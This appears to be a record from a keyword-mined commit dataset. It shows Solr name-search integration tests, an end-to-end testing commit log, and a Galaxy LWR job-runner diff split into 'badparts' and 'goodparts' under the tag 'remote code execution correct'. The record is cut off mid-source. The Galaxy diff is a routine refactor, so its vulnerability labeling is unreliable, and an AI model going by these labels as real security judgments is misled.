'----BEHAVIOUR'},\n           {'name': 'ANDERSON BEHAVIOR CONSULTING INC.'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_resists_qword_matching_several_words(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'ANDERSON BEHAVIOR BEHAVIOR', id='1')\n    verify_results(client, jwt,\n       query='BEHAVIOUR INTERVENTION',\n       expected=[\n           {'name': '----BEHAVIOUR INTERVENTION'},\n           {'name': '----BEHAVIOUR'},\n           {'name': 'ANDERSON BEHAVIOR BEHAVIOR'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_leading_vowel_a(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'AILEEN ENTERPRISES', id='1')\n    verify_results(client, jwt,\n       query='ALAN HARGREAVES CORPORATION',\n       expected=[\n           {'name': '----ALAN HARGREAVES'},\n           {'name': '----ALAN'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_leading_vowel_e(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'ACME', id='1')\n    verify_results(client, jwt,\n       query='EQUIOM',\n       expected=[\n           {'name': '----EQUIOM'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_leading_vowel_not_match_consonant(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'HELENAH WU & CO. INC.', id='1')\n    seed_database_with(solr, 'A BETTER WAY HERBALS LTD.', id='2')\n    verify_results(client, jwt,\n       query='EH',\n       expected=[\n           {'name': '----EH'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_unusual_result(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'DOUBLE J AVIATION LTD.', id='1')\n    verify_results(client, jwt,\n       query='TABLE',\n       expected=[\n           {'name': '----TABLE'}\n       ]\n    )\n\n@integration_synonym_api\n@integration_solr\ndef test_stack_ignores_wildcards(client, jwt, app):\n    verify_results(client, jwt,\n        query=\"TESTING* @WILDCARDS\",\n        expected=[\n            {'name': '----TESTING WILDCARDS'},\n            {'name': '----TESTING'}\n        ]\n    )\n\n@integration_synonym_api\n@integration_solr\n@pytest.mark.parametrize(\"query\", [\n    ('T.H.E.'),\n    ('COMPANY'),\n    ('ASSN'),\n    ('THAT'),\n    ('LIMITED CORP.'),\n])\ndef test_query_stripped_to_empty_string(solr,client, jwt, query):\n    clean_database(solr)\n    seed_database_with(solr, 'JM Van Damme inc', id='1')\n    seed_database_with(solr, 'SOME RANDOM NAME', id='2')\n    verify_results(client, jwt,\n        query=query,\n        expected=[{'name':'----*'}]\n    )\n"}}, "msg": "E2e initial commit (#575)\n\n* Made a separate list of equivalent leading vowel sounds\r\nAdded 'Z' and 'V' to the consonant list\r\nRemoved C <-> G since it was generating too many unexpected results\r\n\r\n* Corrected matching for query/word with leading vowels\r\nRefactored special leading sounds\r\n\r\n* Fixed tests to match new API search divider pattern\r\n\r\n* Added integration_synonym_api decorators\r\nUsed proper pytest skip decorator\r\n\r\n* Initial e2e commit\r\n\r\nSigned-off-by: john_lane <john.a.m.lane@gov.bc.ca>\r\n\r\n* Created jenkinsfile for running nightwatch to run e2e test\r\n\r\n* Changed back to original base image and added nightwatch + chromedriver install steps\r\n\r\n* removed log rotation\r\n\r\n* trying out docker image\r\n\r\n* Added additional braces around node\r\n\r\n* corrected indenting\r\n\r\n* Attempting to use a generic node\r\n\r\n* retrying with docker image post brace correction\r\n\r\n* Added additional attributes to the containerTemplate\r\n\r\n* revised config to match actual chromedriver path\r\n\r\n* add sleep to allow time to rsh to pod\r\n\r\n* fixed path for nightwatch command\r\n\r\n* added config path\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Create global.js\r\n\r\n* Update Jenkinsfile\r\n\r\n* retry with longer time out\r\n\r\n* added sleep stage\r\n\r\n* corrected paths\r\n\r\n* removed failing test run command\r\n\r\n* removed custom assertions from config\r\n\r\n* trying a proper package.json to help with installs\r\n\r\n* trying lower version of chromium\r\n\r\n* removed path for chromium\r\n\r\n* added true chromium path\r\n\r\n* dockerfile\r\n\r\n* Rename dockerfile.txt to dockerfile\r\n\r\n* build.json for template\r\n\r\n* Rename build.json.txt to build.json\r\n\r\n* Rename dockerfile to Dockerfile\r\n\r\n* added our image path\r\n\r\n* corrected pod label\r\n\r\n* Removed run command to allow remote debug\r\n\r\n* trying a yum in the Dockerfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update nightwatch.json\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update package.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update package.json\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update nightwatch.json\r\n\r\n* reconfigured to run geckodriver, removed yum statement from Dockerfile\r\n\r\n* updated image name\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update nightwatch.json\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update nightwatch.json\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update Jenkinsfile\r\n\r\n* post delete\r\n\r\nSigned-off-by: john_lane <john.a.m.lane@gov.bc.ca>\r\n\r\n* refactor nightwatch.json\r\n\r\n* Update Dockerfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* added firefox install to Dockerfile\r\n\r\n* trying new base iamge\r\n\r\n* building new image based on BDDStack\r\n\r\n* Update Jenkinsfile\r\n\r\n* Replacing our custom image with the BDDStack Jenkins Slave\r\n\r\n* slight adjustment to config path\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update nightwatch.json\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update package.json\r\n\r\n* Update package.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update package.json\r\n\r\n* Update package.json\r\n\r\n* Modified the BDDStack image to include the latest firefox binary\r\n\r\n* Jenkinsfile updated to use our image.\r\n\r\n* Reverting to base BDDStack Jenkins slave image\r\n\r\n* adding in the revised nightwatch config - switching to Chrome\r\n\r\n* update chromedriver port\r\n\r\n* downgrade chromedriver version\r\n\r\n* Added more args to chrome config\r\n\r\n* added secret for login info\r\n\r\n* added test run and removed sleep\r\n\r\n* corrected typo in globals\r\n\r\n* added logging to confirm globals\r\n\r\n* Refactored NRO login screen to accomodate changes\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* resolving conflicts\r\n\r\n* Added back sleep stage to allow debug time\r\n\r\n* testing the globals\r\n\r\n* added more wait time\r\n\r\n* removing headless flag and reducing wait time\r\n\r\n* adding back headless flag\r\n\r\n* testing basic URL\r\n\r\n* added new chromeOption to address redirects\r\n\r\n* Added back real URL for redirect test\r\n\r\n* added new arg to webdriver config instead of chrome\r\n\r\n* Trying newer image\r\n\r\n* increment chromedriver version to 2.46\r\n\r\n* hardcoding the redirect URL as a test\r\n\r\n* trying out intermediate click on 302 screen\r\n\r\n* refactored test script for debugging\r\n\r\n* added callback to print title\r\n\r\n* adding user-agent arg to ChromeOptions\r\n\r\n* new logging statement in the test. removed test execution\r\n\r\n* refactored NRO steps to use public page\r\n\r\n* refactored script to use anon flow and keycloak logins\r\n\r\n* Added wait to search page\r\n\r\n* trying Chrome 74 useragent for keycloak redirect\r\n\r\n* refactored script to use auth API\r\n\r\n* small edit to landing page object\r\n\r\n* added missing custom command\r\n\r\n* refactor namex login test\r\n\r\n* another login test\r\n\r\n* login debug\r\n\r\n* new cookie name\r\n\r\n* added other missing custom command\r\n\r\n* Update nightwatch.json\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* remove run command and refactor configs.\r\n\r\n* changed nightwatch version to latest stable\r\n\r\n* Added some waits to firm up the search tests\r\n\r\n* added wait to ensure spinner isn't showing\r\n\r\n* corrected NRO checks\r\n\r\n* Max wait time is now 6 minutes\r\n\r\n* expanded global wait time to 10 seconds (max)\r\n\r\n* updated Jenkinsfile to run tests\r\n\r\n* removed sleep step from Jenkinsfile\r\n\r\n* Firm up steps prior to waiting for updater\r\n\r\n* changed assertions to value instead of text\r\n\r\n* refactored to avoid buggy .clearValue function\r\n\r\n* corrected incorrect addressing of element within page object\r\n\r\n* stopped using the page object within perform\r\n\r\n* changed comparison logic in search page object\r\n\r\n* changed to getValue for NR column\r\n\r\n* Final commit, ready for code review. removed Dockerfile that we are no longer using.\r\n\r\nSigned-off-by: john_lane <john.a.m.lane@gov.bc.ca>\r\n\r\n* Adding back cookie code that was still being used.\r\n\r\n* Revert \"Made a separate list of equivalent leading vowel sounds\"\r\n\r\nThis reverts commit 47009e961bf61ee89678427193bb35fd3bb1e95c.\r\n\r\n* revert commit for pytests"}}, "https://github.com/galaxyproject/galaxy-beta1": {"22e3ab28b73a4de7a2a065d657b017ccbac352d8": {"url": "https://api.github.com/repos/galaxyproject/galaxy-beta1/commits/22e3ab28b73a4de7a2a065d657b017ccbac352d8", "html_url": "https://github.com/galaxyproject/galaxy-beta1/commit/22e3ab28b73a4de7a2a065d657b017ccbac352d8", "message": "Optimize/correct LWR remote metadata generation for working directory outputs.\nPreviously I was attempting to mimic Galaxy's behavior of copying these files to a fixed output location after execution on the remote server before setting metadata. This was an un-needed copy since it appears to easier to just send the metadata generation code the expected path on the working directory.\n\n\nFormer-commit-id: fab9906d2cea455ef81150c999a809d01a2edcab", "sha": "22e3ab28b73a4de7a2a065d657b017ccbac352d8", "keyword": "remote code execution correct", "diff": "diff --git a/lib/galaxy/jobs/runners/lwr.py b/lib/galaxy/jobs/runners/lwr.py\nindex 1f33ae252..7c8d3d3e5 100644\n--- a/lib/galaxy/jobs/runners/lwr.py\n+++ b/lib/galaxy/jobs/runners/lwr.py\n@@ -172,7 +172,6 @@ def __prepare_job(self, job_wrapper, job_destination):\n             job_wrapper.prepare( **prepare_kwds )\n             self.__prepare_input_files_locally(job_wrapper)\n             remote_metadata = LwrJobRunner.__remote_metadata( client )\n-            remote_work_dir_copy = LwrJobRunner.__remote_work_dir_copy( client )\n             dependency_resolution = LwrJobRunner.__dependency_resolution( client )\n             metadata_kwds = self.__build_metadata_configuration(client, job_wrapper, remote_metadata, remote_job_config)\n             remote_command_params = dict(\n@@ -184,7 +183,7 @@ def __prepare_job(self, job_wrapper, job_destination):\n                 self,\n                 job_wrapper=job_wrapper,\n                 include_metadata=remote_metadata,\n-                include_work_dir_outputs=remote_work_dir_copy,\n+                include_work_dir_outputs=False,\n                 remote_command_params=remote_command_params,\n             )\n         except Exception:\n@@ -358,13 +357,7 @@ def shutdown( self ):\n         self.client_manager.shutdown()\n \n     def __client_outputs( self, client, job_wrapper ):\n-        remote_work_dir_copy = LwrJobRunner.__remote_work_dir_copy( client )\n-        if not remote_work_dir_copy:\n-            work_dir_outputs = self.get_work_dir_outputs( job_wrapper )\n-        else:\n-            # They have already been copied over to look like regular outputs remotely,\n-            # no need to handle them differently here.\n-            work_dir_outputs = []\n+        work_dir_outputs = self.get_work_dir_outputs( job_wrapper )\n         output_files = self.get_output_files( job_wrapper )\n         client_outputs = ClientOutputs(\n             working_directory=job_wrapper.working_directory,\n@@ -399,16 +392,6 @@ def __remote_metadata( lwr_client ):\n         remote_metadata = string_as_bool_or_none( lwr_client.destination_params.get( \"remote_metadata\", False ) )\n         return remote_metadata\n \n-    @staticmethod\n-    def __remote_work_dir_copy( lwr_client ):\n-        # Right now remote metadata handling assumes from_work_dir outputs\n-        # have been copied over before it runs. So do that remotely. This is\n-        # not the default though because adding it to the command line is not\n-        # cross-platform (no cp on Windows) and it's un-needed work outside\n-        # the context of metadata settting (just as easy to download from\n-        # either place.)\n-        return LwrJobRunner.__remote_metadata( lwr_client )\n-\n     @staticmethod\n     def __use_remote_datatypes_conf( lwr_client ):\n         \"\"\" When setting remote metadata, use integrated datatypes from this\n@@ -440,7 +423,21 @@ def __build_metadata_configuration(self, client, job_wrapper, remote_metadata, r\n             outputs_directory = remote_job_config['outputs_directory']\n             configs_directory = remote_job_config['configs_directory']\n             working_directory = remote_job_config['working_directory']\n+            # For metadata calculation, we need to build a list of of output\n+            # file objects with real path indicating location on Galaxy server\n+            # and false path indicating location on compute server. Since the\n+            # LWR disables from_work_dir copying as part of the job command\n+            # line we need to take the list of output locations on the LWR\n+            # server (produced by self.get_output_files(job_wrapper)) and for\n+            # each work_dir output substitute the effective path on the LWR\n+            # server relative to the remote working directory as the\n+            # false_path to send the metadata command generation module.\n+            work_dir_outputs = self.get_work_dir_outputs(job_wrapper, job_working_directory=working_directory)\n             outputs = [Bunch(false_path=os.path.join(outputs_directory, os.path.basename(path)), real_path=path) for path in self.get_output_files(job_wrapper)]\n+            for output in outputs:\n+                for lwr_workdir_path, real_path in work_dir_outputs:\n+                    if real_path == output.real_path:\n+                        output.false_path = lwr_workdir_path\n             metadata_kwds['output_fnames'] = outputs\n             metadata_kwds['compute_tmp_dir'] = working_directory\n             metadata_kwds['config_root'] = remote_galaxy_home\n", "files": {"/lib/galaxy/jobs/runners/lwr.py": {"changes": [{"diff": "\n             job_wrapper.prepare( **prepare_kwds )\n             self.__prepare_input_files_locally(job_wrapper)\n             remote_metadata = LwrJobRunner.__remote_metadata( client )\n-            remote_work_dir_copy = LwrJobRunner.__remote_work_dir_copy( client )\n             dependency_resolution = LwrJobRunner.__dependency_resolution( client )\n             metadata_kwds = self.__build_metadata_configuration(client, job_wrapper, remote_metadata, remote_job_config)\n             remote_command_params = dict(\n", "add": 0, "remove": 1, "filename": "/lib/galaxy/jobs/runners/lwr.py", "badparts": ["            remote_work_dir_copy = LwrJobRunner.__remote_work_dir_copy( client )"], "goodparts": []}, {"diff": "\n                 self,\n                 job_wrapper=job_wrapper,\n                 include_metadata=remote_metadata,\n-                include_work_dir_outputs=remote_work_dir_copy,\n+                include_work_dir_outputs=False,\n                 remote_command_params=remote_command_params,\n             )\n         except Exception:\n", "add": 1, "remove": 1, "filename": "/lib/galaxy/jobs/runners/lwr.py", "badparts": ["                include_work_dir_outputs=remote_work_dir_copy,"], "goodparts": ["                include_work_dir_outputs=False,"]}, {"diff": "\n         self.client_manager.shutdown()\n \n     def __client_outputs( self, client, job_wrapper ):\n-        remote_work_dir_copy = LwrJobRunner.__remote_work_dir_copy( client )\n-        if not remote_work_dir_copy:\n-            work_dir_outputs = self.get_work_dir_outputs( job_wrapper )\n-        else:\n-            # They have already been copied over to look like regular outputs remotely,\n-            # no need to handle them differently here.\n-            work_dir_outputs = []\n+        work_dir_outputs = self.get_work_dir_outputs( job_wrapper )\n         output_files = self.get_output_files( job_wrapper )\n         client_outputs = ClientOutputs(\n             working_directory=job_wrapper.working_directory,\n", "add": 1, "remove": 7, "filename": "/lib/galaxy/jobs/runners/lwr.py", "badparts": ["        remote_work_dir_copy = LwrJobRunner.__remote_work_dir_copy( client )", "        if not remote_work_dir_copy:", "            work_dir_outputs = self.get_work_dir_outputs( job_wrapper )", "        else:", "            work_dir_outputs = []"], "goodparts": ["        work_dir_outputs = self.get_work_dir_outputs( job_wrapper )"]}, {"diff": "\n         remote_metadata = string_as_bool_or_none( lwr_client.destination_params.get( \"remote_metadata\", False ) )\n         return remote_metadata\n \n-    @staticmethod\n-    def __remote_work_dir_copy( lwr_client ):\n-        # Right now remote metadata handling assumes from_work_dir outputs\n-        # have been copied over before it runs. So do that remotely. This is\n-        # not the default though because adding it to the command line is not\n-        # cross-platform (no cp on Windows) and it's un-needed work outside\n-        # the context of metadata settting (just as easy to download from\n-        # either place.)\n-        return LwrJobRunner.__remote_metadata( lwr_client )\n-\n     @staticmethod\n     def __use_remote_datatypes_conf( lwr_client ):\n         \"\"\" When setting remote metadata, use integrated datatypes from this\n", "add": 0, "remove": 10, "filename": "/lib/galaxy/jobs/runners/lwr.py", "badparts": ["    @staticmethod", "    def __remote_work_dir_copy( lwr_client ):", "        return LwrJobRunner.__remote_metadata( lwr_client )"], "goodparts": []}], "source": "\nimport logging from galaxy import model from galaxy.jobs.runners import AsynchronousJobState, AsynchronousJobRunner from galaxy.jobs import ComputeEnvironment from galaxy.jobs import JobDestination from galaxy.jobs.command_factory import build_command from galaxy.tools.deps import dependencies from galaxy.util import string_as_bool_or_none from galaxy.util.bunch import Bunch import errno from time import sleep import os from.lwr_client import build_client_manager from.lwr_client import url_to_destination_params from.lwr_client import finish_job as lwr_finish_job from.lwr_client import submit_job as lwr_submit_job from.lwr_client import ClientJobDescription from.lwr_client import LwrOutputs from.lwr_client import ClientOutputs from.lwr_client import PathMapper log=logging.getLogger( __name__) __all__=[ 'LwrJobRunner'] NO_REMOTE_GALAXY_FOR_METADATA_MESSAGE=\"LWR misconfiguration -LWR client configured to set metadata remotely, but remote LWR isn't properly configured with a galaxy_home directory.\" NO_REMOTE_DATATYPES_CONFIG=\"LWR client is configured to use remote datatypes configuration when setting metadata externally, but LWR is not configured with this information. Defaulting to datatypes_conf.xml.\" DEFAULT_GALAXY_URL=\"http://localhost:8080\" class LwrJobRunner( AsynchronousJobRunner): \"\"\" LWR Job Runner \"\"\" runner_name=\"LWRRunner\" def __init__( self, app, nworkers, transport=None, cache=None, url=None, galaxy_url=DEFAULT_GALAXY_URL): \"\"\"Start the job runner \"\"\" super( LwrJobRunner, self).__init__( app, nworkers) self.async_status_updates=dict() self._init_monitor_thread() self._init_worker_threads() client_manager_kwargs={'transport_type': transport, 'cache': string_as_bool_or_none(cache), \"url\": url} self.galaxy_url=galaxy_url self.client_manager=build_client_manager(**client_manager_kwargs) def url_to_destination( self, url): \"\"\"Convert a legacy URL to a job destination\"\"\" return JobDestination( runner=\"lwr\", params=url_to_destination_params( url)) def check_watched_item(self, job_state): try: client=self.get_client_from_state(job_state) if hasattr(self.client_manager, 'ensure_has_status_update_callback'): self.client_manager.ensure_has_status_update_callback(self.__async_update) return job_state status=client.get_status() except Exception: self.mark_as_finished(job_state) return None job_state=self.__update_job_state_for_lwr_status(job_state, status) return job_state def __update_job_state_for_lwr_status(self, job_state, lwr_status): if lwr_status==\"complete\": self.mark_as_finished(job_state) return None if lwr_status==\"running\" and not job_state.running: job_state.running=True job_state.job_wrapper.change_state( model.Job.states.RUNNING) return job_state def __async_update( self, full_status): job_id=full_status[ \"job_id\"] job_state=self.__find_watched_job( job_id) if not job_state: sleep( 2) job_state=self.__find_watched_job( job_id) if not job_state: log.warn( \"Failed to find job corresponding to final status %s in %s\" %( full_status, self.watched)) else: self.__update_job_state_for_lwr_status(job_state, full_status[\"status\"]) def __find_watched_job( self, job_id): found_job=None for async_job_state in self.watched: if str( async_job_state.job_id)==job_id: found_job=async_job_state break return found_job def queue_job(self, job_wrapper): job_destination=job_wrapper.job_destination command_line, client, remote_job_config, compute_environment=self.__prepare_job( job_wrapper, job_destination) if not command_line: return try: dependencies_description=LwrJobRunner.__dependencies_description( client, job_wrapper) rewrite_paths=not LwrJobRunner.__rewrite_parameters( client) unstructured_path_rewrites={} if compute_environment: unstructured_path_rewrites=compute_environment.unstructured_path_rewrites client_job_description=ClientJobDescription( command_line=command_line, input_files=self.get_input_files(job_wrapper), client_outputs=self.__client_outputs(client, job_wrapper), working_directory=job_wrapper.working_directory, tool=job_wrapper.tool, config_files=job_wrapper.extra_filenames, dependencies_description=dependencies_description, env=client.env, rewrite_paths=rewrite_paths, arbitrary_files=unstructured_path_rewrites, ) job_id=lwr_submit_job(client, client_job_description, remote_job_config) log.info(\"lwr job submitted with job_id %s\" % job_id) job_wrapper.set_job_destination( job_destination, job_id) job_wrapper.change_state( model.Job.states.QUEUED) except Exception: job_wrapper.fail( \"failure running job\", exception=True) log.exception(\"failure running job %d\" % job_wrapper.job_id) return lwr_job_state=AsynchronousJobState() lwr_job_state.job_wrapper=job_wrapper lwr_job_state.job_id=job_id lwr_job_state.old_state=True lwr_job_state.running=False lwr_job_state.job_destination=job_destination self.monitor_job(lwr_job_state) def __prepare_job(self, job_wrapper, job_destination): \"\"\" Build command-line and LWR client for this job. \"\"\" command_line=None client=None remote_job_config=None compute_environment=None try: client=self.get_client_from_wrapper(job_wrapper) tool=job_wrapper.tool remote_job_config=client.setup(tool.id, tool.version) rewrite_parameters=LwrJobRunner.__rewrite_parameters( client) prepare_kwds={} if rewrite_parameters: compute_environment=LwrComputeEnvironment( client, job_wrapper, remote_job_config) prepare_kwds[ 'compute_environment']=compute_environment job_wrapper.prepare( **prepare_kwds) self.__prepare_input_files_locally(job_wrapper) remote_metadata=LwrJobRunner.__remote_metadata( client) remote_work_dir_copy=LwrJobRunner.__remote_work_dir_copy( client) dependency_resolution=LwrJobRunner.__dependency_resolution( client) metadata_kwds=self.__build_metadata_configuration(client, job_wrapper, remote_metadata, remote_job_config) remote_command_params=dict( working_directory=remote_job_config['working_directory'], metadata_kwds=metadata_kwds, dependency_resolution=dependency_resolution, ) command_line=build_command( self, job_wrapper=job_wrapper, include_metadata=remote_metadata, include_work_dir_outputs=remote_work_dir_copy, remote_command_params=remote_command_params, ) except Exception: job_wrapper.fail( \"failure preparing job\", exception=True) log.exception(\"failure running job %d\" % job_wrapper.job_id) if not command_line: job_wrapper.finish( '', '') return command_line, client, remote_job_config, compute_environment def __prepare_input_files_locally(self, job_wrapper): \"\"\"Run task splitting commands locally.\"\"\" prepare_input_files_cmds=getattr(job_wrapper, 'prepare_input_files_cmds', None) if prepare_input_files_cmds is not None: for cmd in prepare_input_files_cmds: if 0 !=os.system(cmd): raise Exception('Error running file staging command: %s' % cmd) job_wrapper.prepare_input_files_cmds=None def get_output_files(self, job_wrapper): output_paths=job_wrapper.get_output_fnames() return[ str( o) for o in output_paths] def get_input_files(self, job_wrapper): input_paths=job_wrapper.get_input_paths() return[ str( i) for i in input_paths] def get_client_from_wrapper(self, job_wrapper): job_id=job_wrapper.job_id if hasattr(job_wrapper, 'task_id'): job_id=\"%s_%s\" %(job_id, job_wrapper.task_id) params=job_wrapper.job_destination.params.copy() for key, value in params.iteritems(): if value: params[key]=model.User.expand_user_properties( job_wrapper.get_job().user, value) env=getattr( job_wrapper.job_destination, \"env\",[]) return self.get_client( params, job_id, env) def get_client_from_state(self, job_state): job_destination_params=job_state.job_destination.params job_id=job_state.job_id return self.get_client( job_destination_params, job_id) def get_client( self, job_destination_params, job_id, env=[]): encoded_job_id=self.app.security.encode_id(job_id) job_key=self.app.security.encode_id( job_id, kind=\"jobs_files\") files_endpoint=\"%s/api/jobs/%s/files?job_key=%s\" %( self.galaxy_url, encoded_job_id, job_key ) get_client_kwds=dict( job_id=str( job_id), files_endpoint=files_endpoint, env=env ) return self.client_manager.get_client( job_destination_params, **get_client_kwds) def finish_job( self, job_state): stderr=stdout='' job_wrapper=job_state.job_wrapper try: client=self.get_client_from_state(job_state) run_results=client.full_status() stdout=run_results.get('stdout', '') stderr=run_results.get('stderr', '') exit_code=run_results.get('returncode', None) lwr_outputs=LwrOutputs.from_status_response(run_results) completed_normally=\\ job_wrapper.get_state() not in[ model.Job.states.ERROR, model.Job.states.DELETED] cleanup_job=self.app.config.cleanup_job client_outputs=self.__client_outputs(client, job_wrapper) finish_args=dict( client=client, job_completed_normally=completed_normally, cleanup_job=cleanup_job, client_outputs=client_outputs, lwr_outputs=lwr_outputs) failed=lwr_finish_job( **finish_args) if failed: job_wrapper.fail(\"Failed to find or download one or more job outputs from remote server.\", exception=True) except Exception: message=\"Failed to communicate with remote job server.\" job_wrapper.fail( message, exception=True) log.exception(\"failure finishing job %d\" % job_wrapper.job_id) return if not LwrJobRunner.__remote_metadata( client): self._handle_metadata_externally( job_wrapper, resolve_requirements=True) try: job_wrapper.finish( stdout, stderr, exit_code) except Exception: log.exception(\"Job wrapper finish method failed\") job_wrapper.fail(\"Unable to finish job\", exception=True) def fail_job( self, job_state): \"\"\" Seperated out so we can use the worker threads for it. \"\"\" self.stop_job( self.sa_session.query( self.app.model.Job).get( job_state.job_wrapper.job_id)) job_state.job_wrapper.fail( job_state.fail_message) def check_pid( self, pid): try: os.kill( pid, 0) return True except OSError, e: if e.errno==errno.ESRCH: log.debug( \"check_pid(): PID %d is dead\" % pid) else: log.warning( \"check_pid(): Got errno %s when attempting to check PID %d: %s\" %( errno.errorcode[e.errno], pid, e.strerror)) return False def stop_job( self, job): job_ext_output_metadata=job.get_external_output_metadata() if job_ext_output_metadata: pid=job_ext_output_metadata[0].job_runner_external_pid if pid in[ None, '']: log.warning( \"stop_job(): %s: no PID in database for job, unable to stop\" % job.id) return pid=int( pid) if not self.check_pid( pid): log.warning( \"stop_job(): %s: PID %d was already dead or can't be signaled\" %( job.id, pid)) return for sig in[ 15, 9]: try: os.killpg( pid, sig) except OSError, e: log.warning( \"stop_job(): %s: Got errno %s when attempting to signal %d to PID %d: %s\" %( job.id, errno.errorcode[e.errno], sig, pid, e.strerror)) return sleep( 2) if not self.check_pid( pid): log.debug( \"stop_job(): %s: PID %d successfully killed with signal %d\" %( job.id, pid, sig)) return else: log.warning( \"stop_job(): %s: PID %d refuses to die after signaling TERM/KILL\" %( job.id, pid)) else: lwr_url=job.job_runner_name job_id=job.job_runner_external_id log.debug(\"Attempt remote lwr kill of job with url %s and id %s\" %(lwr_url, job_id)) client=self.get_client(job.destination_params, job_id) client.kill() def recover( self, job, job_wrapper): \"\"\"Recovers jobs stuck in the queued/running state when Galaxy started\"\"\" job_state=AsynchronousJobState() job_state.job_id=str( job.get_job_runner_external_id()) job_state.runner_url=job_wrapper.get_job_runner_url() job_state.job_destination=job_wrapper.job_destination job_wrapper.command_line=job.get_command_line() job_state.job_wrapper=job_wrapper state=job.get_state() if state in[model.Job.states.RUNNING, model.Job.states.QUEUED]: log.debug( \"(LWR/%s) is still in running state, adding to the LWR queue\" %( job.get_id())) job_state.old_state=True job_state.running=state==model.Job.states.RUNNING self.monitor_queue.put( job_state) def shutdown( self): super( LwrJobRunner, self).shutdown() self.client_manager.shutdown() def __client_outputs( self, client, job_wrapper): remote_work_dir_copy=LwrJobRunner.__remote_work_dir_copy( client) if not remote_work_dir_copy: work_dir_outputs=self.get_work_dir_outputs( job_wrapper) else: work_dir_outputs=[] output_files=self.get_output_files( job_wrapper) client_outputs=ClientOutputs( working_directory=job_wrapper.working_directory, work_dir_outputs=work_dir_outputs, output_files=output_files, version_file=job_wrapper.get_version_string_path(), ) return client_outputs @staticmethod def __dependencies_description( lwr_client, job_wrapper): dependency_resolution=LwrJobRunner.__dependency_resolution( lwr_client) remote_dependency_resolution=dependency_resolution==\"remote\" if not remote_dependency_resolution: return None requirements=job_wrapper.tool.requirements or[] installed_tool_dependencies=job_wrapper.tool.installed_tool_dependencies or[] return dependencies.DependenciesDescription( requirements=requirements, installed_tool_dependencies=installed_tool_dependencies, ) @staticmethod def __dependency_resolution( lwr_client): dependency_resolution=lwr_client.destination_params.get( \"dependency_resolution\", \"local\") if dependency_resolution not in[\"none\", \"local\", \"remote\"]: raise Exception(\"Unknown dependency_resolution value encountered %s\" % dependency_resolution) return dependency_resolution @staticmethod def __remote_metadata( lwr_client): remote_metadata=string_as_bool_or_none( lwr_client.destination_params.get( \"remote_metadata\", False)) return remote_metadata @staticmethod def __remote_work_dir_copy( lwr_client): return LwrJobRunner.__remote_metadata( lwr_client) @staticmethod def __use_remote_datatypes_conf( lwr_client): \"\"\" When setting remote metadata, use integrated datatypes from this Galaxy instance or use the datatypes config configured via the remote LWR. Both options are broken in different ways for same reason -datatypes may not match. One can push the local datatypes config to the remote server -but there is no guarentee these datatypes will be defined there. Alternatively, one can use the remote datatype config -but there is no guarentee that it will contain all the datatypes available to this Galaxy. \"\"\" use_remote_datatypes=string_as_bool_or_none( lwr_client.destination_params.get( \"use_remote_datatypes\", False)) return use_remote_datatypes @staticmethod def __rewrite_parameters( lwr_client): return string_as_bool_or_none( lwr_client.destination_params.get( \"rewrite_parameters\", False)) or False def __build_metadata_configuration(self, client, job_wrapper, remote_metadata, remote_job_config): metadata_kwds={} if remote_metadata: remote_system_properties=remote_job_config.get(\"system_properties\",{}) remote_galaxy_home=remote_system_properties.get(\"galaxy_home\", None) if not remote_galaxy_home: raise Exception(NO_REMOTE_GALAXY_FOR_METADATA_MESSAGE) metadata_kwds['exec_dir']=remote_galaxy_home outputs_directory=remote_job_config['outputs_directory'] configs_directory=remote_job_config['configs_directory'] working_directory=remote_job_config['working_directory'] outputs=[Bunch(false_path=os.path.join(outputs_directory, os.path.basename(path)), real_path=path) for path in self.get_output_files(job_wrapper)] metadata_kwds['output_fnames']=outputs metadata_kwds['compute_tmp_dir']=working_directory 